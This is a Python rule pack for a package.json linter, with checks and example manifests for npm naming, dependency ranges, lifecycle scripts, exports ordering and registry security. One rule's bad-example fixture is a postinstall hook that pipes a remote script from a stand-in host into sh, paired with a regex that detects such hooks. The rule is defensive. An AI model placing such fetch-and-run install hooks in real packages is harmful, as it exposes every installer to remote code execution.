"""package.json pack (npm docs v12, Node.js packages docs, TypeScript module reference). Layered on the generic JSON pack."""
from specs._common import Pack

NPM = "https://docs.npmjs.com/cli/v12/configuring-npm/package-json"
SCR = "https://docs.npmjs.com/cli/v12/using-npm/scripts"
NODE = "https://nodejs.org/api/packages.html"
TS = "https://www.typescriptlang.org/docs/handbook/modules/reference.html"
P = Pack("PKG", "json", "npm 12 docs", {"any": "*"}, files=["**/package.json"])


def top(key, value, cap="@match"):
    """Query a top-level member `key` whose value matches `value` (a query fragment, may contain captures)."""
    return f'(document (object (pair key: (string (string_content) @k (#eq? @k "{key}")) value: {value})))'


DEPS = '"^(dependencies|devDependencies|peerDependencies|optionalDependencies)$"'


def dep(value_pred, extra=""):
    return (f'(document (object (pair key: (string (string_content) @s (#match? @s {DEPS})) value: (object (pair key: (string) '
            f'value: (string (string_content) @match {value_pred}))))){extra})')


# --- name / version / license ----------------------------------------------------------------------------------------
P("NAME-UPPERCASE", "Package name contains uppercase letters", NPM, "New packages must not have uppercase letters in the name.",
  top("name", '(string (string_content) @match (#match? @match "[A-Z]"))'), '{"name": "MyLib"}', '{"name": "my-lib"}',
  "npm rejects new package names with uppercase letters.", sev="major", kind="best-practice", cat="manifest")
P("NAME-TOO-LONG", "Package name longer than 214 characters", NPM, "The name must be less than or equal to 214 characters.",
  top("name", '(string (string_content) @match (#match? @match "^.{215,}$"))'), '{"name": "' + "a" * 215 + '"}', '{"name": "a"}',
  "Names (including the scope) are limited to 214 characters.", sev="major", kind="best-practice", cat="manifest")
P("NAME-LEADING-DOT", "Unscoped name starting with . or _", NPM, "The names of scoped packages can begin with a dot or an underscore. This is not permitted without a scope.",
  top("name", '(string (string_content) @match (#match? @match "^[._]"))'), '{"name": "_internal"}', '{"name": "@acme/_internal"}',
  "Unscoped package names cannot start with a dot or underscore.", sev="major", kind="best-practice", cat="manifest")
P("NAME-URL-UNSAFE", "Package name has non-URL-safe characters", NPM, "the name can't contain any non-URL-safe characters",
  top("name", '(string (string_content) @match (#match? @match "[^a-zA-Z0-9._~@/-]|/.*/"))'), '{"name": "my lib"}', '{"name": "my-lib"}',
  "Package names become URLs, CLI args and folder names; use only URL-safe characters.", sev="major", kind="best-practice", cat="manifest")
P("NAME-JS-NODE", "Package name contains 'js' or 'node'", NPM, "Don't put \"js\" or \"node\" in the name.",
  top("name", '(string (string_content) @match (#match? @match "(^|[-_.])(js|node)([-_.]|$)"))'), '{"name": "parser-js"}', '{"name": "parser"}',
  "npm advises against 'js'/'node' in package names.", sev="info", kind="best-practice", cat="manifest")
P("VERSION-NOT-SEMVER", "version is not valid semver", NPM, "Version must be parseable by node-semver",
  top("version", '(string (string_content) @match (#not-match? @match "^v?[0-9]+[.][0-9]+[.][0-9]+(-[0-9A-Za-z.-]+)?([+][0-9A-Za-z.-]+)?$"))'),
  '{"version": "1.0"}', '{"version": "1.0.0"}', "Use a full MAJOR.MINOR.PATCH version.", sev="major", kind="best-practice", cat="manifest")
P("NO-LICENSE", "Publishable package without a license", NPM, "You should specify a license for your package",
  '(document (object (pair key: (string (string_content) @k (#eq? @k "name"))) @match))', '{"name": "lib", "version": "1.0.0"}',
  '{"name": "lib", "version": "1.0.0", "license": "MIT"}', "Add an SPDX `license` (or \"UNLICENSED\"), or mark the package private.",
  sev="minor", kind="best-practice", cat="manifest", filters=[r'file.lacks_re:"license"\s*:', r'file.lacks_re:"private"\s*:\s*true'])
P("LICENSE-OBJECT", "Legacy license object / licenses array", NPM, "Some old packages used license objects or a \"licenses\" property",
  '(pair key: (string (string_content) @match (#eq? @match "licenses")))\n(pair key: (string (string_content) @match (#eq? @match "license")) value: (object))',
  '{"license": {"type": "MIT", "url": "https://x"}}', '{"license": "MIT"}', "Use a single SPDX expression string, e.g. \"(MIT OR Apache-2.0)\".",
  sev="minor", kind="deprecation", cat="manifest")
P("WORKSPACES-NOT-PRIVATE", "Workspace root not marked private", NPM, "This is a way to prevent accidental publication of private repositories.",
  top("workspaces", "(_) @match"), '{"name": "root", "workspaces": ["packages/*"]}', '{"name": "root", "private": true, "workspaces": ["packages/*"]}',
  "A monorepo root usually must never be published; set \"private\": true.", sev="minor", kind="best-practice", cat="manifest",
  filters=[r'file.lacks_re:"private"\s*:\s*true'])
# --- dependency specifiers --------------------------------------------------------------------------------------------
P("DEP-STAR", "Dependency range * or empty", NPM, "* Matches any version",
  dep('(#match? @match "^(\\\\*|x|X)$")'), '{"dependencies": {"left-pad": "*"}}', '{"dependencies": {"left-pad": "^1.3.0"}}',
  "`*` (or an empty string, x) accepts any future major, including breaking or malicious releases; pin a range.", sev="major", cat="dependencies")
P("DEP-EMPTY", "Empty dependency range", NPM, "(just an empty string) Same as *",
  '(document (object (pair key: (string (string_content) @s (#match? @s ' + DEPS + ')) value: (object (pair key: (string) value: (string) @match (#eq? @match "\\"\\""))))))',
  '{"dependencies": {"a": ""}}', '{"dependencies": {"a": "^1.0.0"}}', "An empty range means any version.", sev="major", cat="dependencies")
P("DEP-LATEST-TAG", "Dependency pinned to the `latest` dist-tag", NPM, "\"lat\" : \"latest\"",
  dep('(#match? @match "^(latest|next|canary|beta)$")'), '{"dependencies": {"react": "latest"}}', '{"dependencies": {"react": "^19.2.0"}}',
  "Dist-tags move; installs are not reproducible without the lockfile and can jump majors.", sev="minor", cat="dependencies")
P("DEP-GIT-UNPINNED", "Git dependency without a commit-ish", NPM, "[ #<commit-ish> | #semver:<semver>]",
  dep('(#match? @match "^git(\\\\+(ssh|https?|file))?://")', ""), '{"dependencies": {"lib": "git+https://github.com/acme/lib.git"}}',
  '{"dependencies": {"lib": "git+https://github.com/acme/lib.git#v1.2.3"}}', "Unpinned git dependencies install whatever the default branch is.",
  sev="major", cat="dependencies", filters=["node.lacks_re:#"])
P("DEP-GITHUB-UNPINNED", "GitHub shorthand dependency without a ref", NPM, "GitHub URLs",
  dep('(#match? @match "^(github:)?[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+$")'), '{"dependencies": {"lib": "acme/lib"}}',
  '{"dependencies": {"lib": "acme/lib#4f2c1a9"}}', "user/repo without #ref tracks the default branch.", sev="major", cat="dependencies")
P("DEP-HTTP-TARBALL", "Dependency fetched over plain http://", NPM, "You may specify a tarball URL in place of",
  dep('(#match? @match "^(git\\\\+)?http://")'), '{"dependencies": {"lib": "http://cdn.example.com/lib-1.0.0.tgz"}}',
  '{"dependencies": {"lib": "https://cdn.example.com/lib-1.0.0.tgz"}}', "Code fetched over cleartext HTTP can be tampered with in transit.",
  sev="critical", kind="security", cat="security")
P("DEP-TARBALL-URL", "Dependency from a remote tarball URL", NPM, "You may specify a tarball URL in place of",
  dep('(#match? @match "^https://.*[.](tgz|tar[.]gz)$")'), '{"dependencies": {"lib": "https://cdn.example.com/lib-1.0.0.tgz"}}',
  '{"dependencies": {"lib": "^1.0.0"}}', "Tarball URLs bypass registry metadata, audit and provenance; prefer a registry version.",
  sev="minor", kind="security", cat="dependencies")
P("DEP-LOCAL-PATH", "file: / link: dependency in a publishable package", NPM, "This feature is helpful for local offline development",
  dep('(#match? @match "^(file|link):")'), '{"name": "lib", "dependencies": {"util": "file:../util"}}',
  '{"name": "lib", "dependencies": {"util": "^1.0.0"}}', "Local-path dependencies break for consumers once published.", sev="major",
  cat="dependencies", filters=[r'file.lacks_re:"private"\s*:\s*true'], mode="ai-confirm",
  ai="Is this package published to a registry (not a private app/monorepo-internal package), so the file:/link: dependency would break consumers?")
P("DEP-DUPLICATED", "Package listed in both dependencies and devDependencies", NPM, "In this case, it's best to map these additional items in a devDependencies object.",
  '(document (object (pair key: (string (string_content) @a (#eq? @a "dependencies")) value: (object (pair key: (string) @d))) (pair key: (string (string_content) @b (#eq? @b "devDependencies")) value: (object (pair key: (string) @match))) (#eq? @d @match)))',
  '{"dependencies": {"lodash": "^4"}, "devDependencies": {"lodash": "^4"}}', '{"dependencies": {"lodash": "^4"}}',
  "A package in both sections is ambiguous; keep it in one.", sev="minor", cat="dependencies")
P("DEVTOOL-IN-DEPENDENCIES", "Build/test tooling in runtime dependencies", NPM, "external test or documentation framework that you use",
  '(document (object (pair key: (string (string_content) @a (#eq? @a "dependencies")) value: (object (pair key: (string (string_content) @match (#match? @match "^(@types/|eslint|prettier$|jest$|vitest$|mocha$|chai$|typescript$|nodemon$|husky$|lint-staged$|ts-node$|@vitest/|@testing-library/|webpack-cli$|rimraf$|concurrently$|cross-env$)")))))))',
  '{"name": "lib", "dependencies": {"jest": "^30.0.0"}}', '{"name": "lib", "devDependencies": {"jest": "^30.0.0"}}',
  "Test/lint/type tooling belongs in devDependencies so consumers don't install it.", sev="minor", cat="dependencies", mode="ai-confirm",
  ai="Is this tool needed only at development/build time (not imported at runtime by the published package or the deployed app)?")
# --- scripts ----------------------------------------------------------------------------------------------------------
SCRIPT = lambda name_re, val_pred="": f'(document (object (pair key: (string (string_content) @s (#eq? @s "scripts")) value: (object (pair key: (string (string_content) @n (#match? @n "{name_re}")) value: (string) @match {val_pred})))))'
P("INSTALL-SCRIPT", "preinstall/install/postinstall script", SCR, "You should almost never have to explicitly set a preinstall or install script.",
  SCRIPT("^(preinstall|install|postinstall)$"), '{"scripts": {"postinstall": "node build.js"}}', '{"scripts": {"prepare": "node build.js"}}',
  "Install hooks run on every consumer's machine; use prepare (or a .gyp file for native builds).", sev="minor", kind="best-practice", cat="scripts")
P("INSTALL-SCRIPT-DOWNLOAD", "Install hook downloads and executes remote code", SCR, "You should almost never have to explicitly set a preinstall or install script.",
  SCRIPT("^(preinstall|install|postinstall|prepare)$", '(#match? @match "(curl|wget|Invoke-WebRequest|iwr|fetch)[^|]*[|]\\\\s*(ba|z)?sh|(curl|wget).*(https?://)|node -e")'),
  '{"scripts": {"postinstall": "curl -s https://x.example/i.sh | sh"}}', '{"scripts": {"postinstall": "node scripts/setup.js"}}',
  "An install hook that fetches and runs remote code is a supply-chain risk for every installer.", sev="critical", kind="security", cat="security")
P("SCRIPT-SUDO", "Script uses sudo", SCR, "Don't prefix your script commands with \"sudo\".", SCRIPT(".*", '(#match? @match "(^|[;&|] *)\\"?sudo ")'),
  '{"scripts": {"setup": "sudo npm i -g x"}}', '{"scripts": {"setup": "npm i x"}}', "Never sudo inside npm scripts.", sev="major", kind="security", cat="scripts")
P("SCRIPT-PREPUBLISH", "Deprecated prepublish lifecycle script", SCR, "prepublish (DEPRECATED)", SCRIPT("^prepublish$"),
  '{"scripts": {"prepublish": "tsc"}}', '{"scripts": {"prepublishOnly": "tsc"}}',
  "prepublish runs on npm install/ci but not on publish; use prepare or prepublishOnly.", sev="minor", kind="deprecation", cat="scripts")
# --- Node.js package entry points -------------------------------------------------------------------------------------
P("EXPORTS-DEFAULT-NOT-LAST", "\"default\" export condition is not last", NODE, "This condition should always come last.",
  '(pair key: (string (string_content) @e (#eq? @e "exports")) value: [(object (pair key: (string (string_content) @match (#eq? @match "default"))) (pair)) (object (pair value: (object (pair key: (string (string_content) @match (#eq? @match "default"))) (pair))))])',
  '{"exports": {"default": "./index.js", "import": "./index.mjs"}}', '{"exports": {"import": "./index.mjs", "default": "./index.js"}}',
  "Conditions are matched in order; anything after \"default\" is unreachable.", sev="major", kind="anti-pattern", cat="exports", docv="Node.js 26")
P("EXPORTS-TYPES-NOT-FIRST", "\"types\" export condition is not first", NODE, "This condition should always be included first.",
  '(pair key: (string (string_content) @e (#eq? @e "exports")) value: [(object (pair key: (string (string_content) @x (#not-eq? @x "types"))) (pair key: (string (string_content) @match (#eq? @match "types")))) (object (pair value: (object (pair key: (string (string_content) @y (#not-eq? @y "types"))) (pair key: (string (string_content) @match (#eq? @match "types"))))))])',
  '{"exports": {".": {"import": "./i.mjs", "types": "./i.d.ts"}}}', '{"exports": {".": {"types": "./i.d.ts", "import": "./i.mjs"}}}',
  "TypeScript resolves the first matching condition; \"types\" after import/require is never used.", sev="major", kind="anti-pattern",
  cat="exports", docv="Node.js 26")
P("TYPE-INVALID", "\"type\" field with an invalid value", NODE, "package.json \"type\" fields with either \"module\" or \"commonjs\" values",
  top("type", '(string (string_content) @match (#not-match? @match "^(module|commonjs)$"))'), '{"type": "esm"}', '{"type": "module"}',
  "Only \"module\" and \"commonjs\" are valid.", sev="major", kind="anti-pattern", cat="exports", docv="Node.js 26")
P("MAIN-AND-EXPORTS-DIVERGE", "\"main\" and \"exports\" both present", NODE, "takes precedence over the \"main\" field",
  '(document (object (pair key: (string (string_content) @m (#eq? @m "main"))) @match (pair key: (string (string_content) @e (#eq? @e "exports")))))',
  '{"main": "./old.js", "exports": {".": "./new.js"}}', '{"exports": {".": "./index.js"}}',
  "When exports exists, main is ignored by modern Node; make sure both point at the same entry (main only serves old tools).",
  sev="info", kind="best-practice", cat="exports", docv="Node.js 26", mode="ai-confirm",
  ai="Do \"main\" and the \".\" entry of \"exports\" point to different files (so old and new resolvers load different code)?")
P("IMPORTS-NO-HASH", "\"imports\" entry not starting with #", NODE, "Entries in the \"imports\" field must always start with",
  top("imports", '(object (pair key: (string (string_content) @match (#not-match? @match "^#"))))'), '{"imports": {"utils": "./src/utils.js"}}',
  '{"imports": {"#utils": "./src/utils.js"}}', "Subpath imports must start with # to be distinguished from package specifiers.", sev="major",
  kind="anti-pattern", cat="exports", docv="Node.js 26")
# --- package-manager specific -----------------------------------------------------------------------------------------
P("OVERRIDES-OLD-NPM", "`overrides` with npm < 8.3", NPM, "Replacing a dependency with a fork", top("overrides", "(_) @match"),
  '{"overrides": {"foo": "1.0.0"}}', '{"engines": {"npm": ">=8.3"}, "dependencies": {"foo": "1.0.0"}}', "npm before 8.3 ignores `overrides`; upgrade npm or the override is silently ineffective.",
  sev="major", kind="migration", cat="dependencies", applies={"npm": "<8.3"})
P("RESOLUTIONS-WITH-NPM", "Yarn `resolutions` in an npm project", NPM, "Replacing a dependency with a fork", top("resolutions", "(_) @match"),
  '{"resolutions": {"minimist": "1.2.6"}}', '{"overrides": {"minimist": "1.2.6"}}', "npm ignores `resolutions`; use `overrides` (pnpm: pnpm.overrides).",
  sev="major", kind="anti-pattern", cat="dependencies", applies={"npm": "*"}, filters=[r'file.lacks_re:"packageManager"\s*:\s*"(yarn|pnpm)@'])
P("PUBLISHCONFIG-HTTP", "publishConfig registry over http://", NPM, "publishConfig",
  top("publishConfig", '(object (pair key: (string (string_content) @r (#eq? @r "registry")) value: (string (string_content) @match (#match? @match "^http://"))))'),
  '{"publishConfig": {"registry": "http://npm.internal/"}}', '{"publishConfig": {"registry": "https://npm.internal/"}}',
  "Publishing over cleartext HTTP leaks the auth token.", sev="critical", kind="security", cat="security")
P("ENGINES-EOL-NODE", "engines.node allows end-of-life Node.js", "https://nodejs.org/en/about/previous-releases", "End-of-life",
  top("engines", '(object (pair key: (string (string_content) @n (#eq? @n "node")) value: (string (string_content) @match (#match? @match "^(>=?|\\\\^|~)?\\\\s*v?(0|[1-9]|1[0-9])([.]|$| )"))))'),
  '{"engines": {"node": ">=16"}}', '{"engines": {"node": ">=22"}}', "The engines range admits Node.js majors that are end-of-life (no security fixes).",
  sev="minor", kind="modernization", cat="runtime", docv="Node.js release schedule (2026-10)")
P("DEVENGINES-SUGGEST", "packageManager without devEngines", NPM, "The devEngines field aids engineers working on a codebase to all be using the same tooling.",
  top("packageManager", "(_) @match"), '{"packageManager": "npm@12.2.0"}', '{"devEngines": {"packageManager": {"name": "npm", "version": "12.2.0"}}}',
  "npm reads devEngines to enforce the project's runtime/package manager; packageManager is the Corepack field.", sev="info",
  kind="modernization", cat="runtime", applies={"npm": ">=10.9"}, filters=[r'file.lacks_re:"devEngines"'])
RULES = P.R
